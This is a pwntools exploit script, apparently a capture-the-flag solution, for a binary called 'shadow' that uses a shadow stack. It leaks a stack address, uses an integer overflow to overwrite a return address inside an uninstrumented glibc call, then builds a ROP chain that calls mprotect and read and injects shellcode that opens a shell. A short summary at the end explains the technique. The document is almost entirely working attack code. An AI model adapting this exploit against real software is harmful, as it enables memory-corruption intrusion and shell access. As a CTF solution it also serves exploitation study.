#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'sp', '-h']

elf = ELF('./shadow')

io = process(elf.path)

io.sendafter('name : ', 'A' * 0xf + 'B')
io.sendlineafter('length : ', '11')
io.sendlineafter('message : ', 'D' * 9)

io.recv(35)
read_ret = u32(io.recv(4)) - 0x100

log.info('Read ret @ {:#x}'.format(read_ret))

io.sendlineafter('(y/n) : ', 'n')

io.sendlineafter('length : ', '-1')
io.sendlineafter('message : ', 'B' * 52 + p32(read_ret) + p32(0x100) + p32(0x3))

shellcode = asm(shellcraft.i386.linux.sh())

rop_chain = flat(
	elf.sym['mprotect'],
	0x08048944,    		# pop ebx; pop esi; pop ebp; ret;
	0x804a000,		# addr
	0x1000,	    		# len
	1 | 2 | 4,  		# prot
	elf.sym['read'],
	0x08048944,    		# pop ebx; pop esi; pop ebp; ret;
	0x0,			# fd
	0x804a050,		# buf
	len(shellcode) + 4,	# count
	0x08048945,		# pop esi; pop ebp; ret;
	0x8049ffd,		# buf - 0x53
	0x0,
	0x080489d3		# call dword ptr [esi + 0x53];
	)

io.sendafter('name : ', rop_chain)

io.send(p32(0x804a054) + shellcode)

io.interactive()

"""
TL;DR
Implements a shadow stack but libraries used aren't instrumented.
Leak a stack address then overwrite where a call from glibc would return using integer overflow.
Get shell using shellcode.
"""